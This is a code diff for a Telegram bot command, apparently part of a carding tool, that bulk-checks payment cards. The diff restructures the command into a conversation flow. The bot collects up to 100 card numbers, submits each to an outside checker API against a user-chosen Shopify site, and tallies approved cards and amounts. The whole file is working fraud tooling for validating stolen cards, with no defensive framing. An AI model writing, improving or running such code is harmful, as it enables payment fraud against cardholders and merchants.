@@ -3437,47 +3437,47 @@ import json
 from html import escape
 from telegram import Update
 from telegram.constants import ParseMode
-from telegram.ext import ContextTypes
+from telegram.ext import CommandHandler, MessageHandler, filters, ConversationHandler, ContextTypes
 from db import get_user
 
-async def msp(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Mass Shopify card checker"""
+WAITING_CARDS = 1
+
+async def msp_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Start /msp conversation and ask user for cards"""
     user_id = update.effective_user.id
     user_data = await get_user(user_id)
-
-    # Fetch the site URL the user added
     site = user_data.get("custom_url")
+
     if not site:
         await update.message.reply_text("❌ You have not added any sites. Use /seturl first.")
-        return
+        return ConversationHandler.END
 
-    # Ask user to send cards
-    prompt_msg = await update.message.reply_text(
+    await update.message.reply_text(
         "⏳ 𝓟𝓵𝓮𝓪𝓼𝓮 send your cards (max 100) as text or .txt file.",
         parse_mode=ParseMode.HTML
     )
+    # Save site in context for next step
+    context.user_data["site"] = site
+    return WAITING_CARDS
 
-    def check_cards(m):
-        return m.from_user.id == user_id and (m.text or m.document)
+async def msp_receive_cards(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Receive cards and process them"""
+    site = context.user_data.get("site")
+    if not site:
+        await update.message.reply_text("❌ Site URL missing.")
+        return ConversationHandler.END
 
-    try:
-        cards_msg = await context.application.bot.wait_for("message", timeout=120, check=check_cards)
-    except asyncio.TimeoutError:
-        await prompt_msg.edit_text("❌ Timeout: You did not send cards in time.")
-        return
-
-    # Extract cards
     cards = []
-    if cards_msg.text:
-        cards = [c.strip() for c in cards_msg.text.splitlines() if c.strip()]
-    elif cards_msg.document:
-        file = await cards_msg.document.get_file()
+    if update.message.text:
+        cards = [c.strip() for c in update.message.text.splitlines() if c.strip()]
+    elif update.message.document:
+        file = await update.message.document.get_file()
         content = await file.download_as_bytearray()
         cards = [c.strip() for c in content.decode().splitlines() if c.strip()]
 
     if not cards:
         await update.message.reply_text("❌ No cards found in your message/file.")
-        return
+        return ConversationHandler.END
 
     stats = {"total": len(cards), "working": 0, "dead": 0, "error": 0, "checked": 0, "amt": 0.0}
     card_results = []
@@ -3502,13 +3502,12 @@ async def msp(update: Update, context: ContextTypes.DEFAULT_TYPE):
             api_url = f"https://auto-shopify-6cz4.onrender.com/index.php?site={site}&cc={card}"
             try:
                 async with session.get(api_url, timeout=50) as resp:
-                    raw_text = await resp.text()
-                    data = json.loads(raw_text)
+                    data = await resp.json()
 
                 response_text = data.get("Response", "").upper()
                 price = float(data.get("Price", 0.0))
 
-                if "3D_AUTHENTICATION" in response_text:
+                if "3D_AUTHENTICATION" in response_text or "APPROVED" in response_text:
                     status_emoji = "✅"
                     stats["working"] += 1
                     stats["amt"] += price
@@ -3522,7 +3521,7 @@ async def msp(update: Update, context: ContextTypes.DEFAULT_TYPE):
                 stats["checked"] += 1
                 card_results.append(f"{status_emoji} <code>{escape(card)}</code>\n   ↳ {escape(response_text)}")
 
-                # Update live message
+                # Update live message (last 10 cards only)
                 formatted_results = "\n".join(card_results[-10:])
                 await status_msg.edit_text(
                     f"📊 𝑴𝒂𝒔𝒔 𝑺𝒉𝒐𝒑𝒊𝒇𝔂 𝑪𝒉𝒆𝒄𝒌𝒆𝒓\n"
@@ -3542,25 +3541,10 @@ async def msp(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
                 await asyncio.sleep(0.5)
 
-            except Exception as e:
+            except Exception:
                 stats["error"] += 1
                 stats["checked"] += 1
                 card_results.append(f"⚠️ <code>{escape(card)}</code>\n   ↳ API Error")
-                await status_msg.edit_text(
-                    f"📊 𝑴𝒂𝒔𝒔 𝑺𝒉𝒐𝒑𝒊𝒇𝔂 𝑪𝒉𝒆𝒄𝒌𝒆𝒓\n"
-                    "━━━━━━━━━━━━━━━━━━━━━━━\n"
-                    f"🌍 Total cards: {stats['total']}\n"
-                    f"✅ Approved: {stats['working']}\n"
-                    f"❌ Declined: {stats['dead']}\n"
-                    f"⚠️ Error: {stats['error']}\n"
-                    f"🔄 Checked: {stats['checked']} / {stats['total']}\n"
-                    f"💲 Amount: ${stats['amt']:.2f}\n"
-                    "━━━━━━━━━━━━━━━━━━━━━━━\n\n"
-                    "📝 Card Results\n"
-                    "━━━━━━━━━━━━━━━━━━━━━━━\n"
-                    + "\n".join(card_results[-10:]),
-                    parse_mode=ParseMode.HTML
-                )
 
     # Final message
     await status_msg.edit_text(
@@ -3578,6 +3562,15 @@ async def msp(update: Update, context: ContextTypes.DEFAULT_TYPE):
         + "\n".join(card_results),
         parse_mode=ParseMode.HTML
     )
+
+    return ConversationHandler.END
+
+# ConversationHandler to use
+msp_handler = ConversationHandler(
+    entry_points=[CommandHandler("msp", msp_start)],
+    states={WAITING_CARDS: [MessageHandler(filters.TEXT | filters.Document.ALL, msp_receive_cards)]},
+    fallbacks=[],
+)
 
 
 
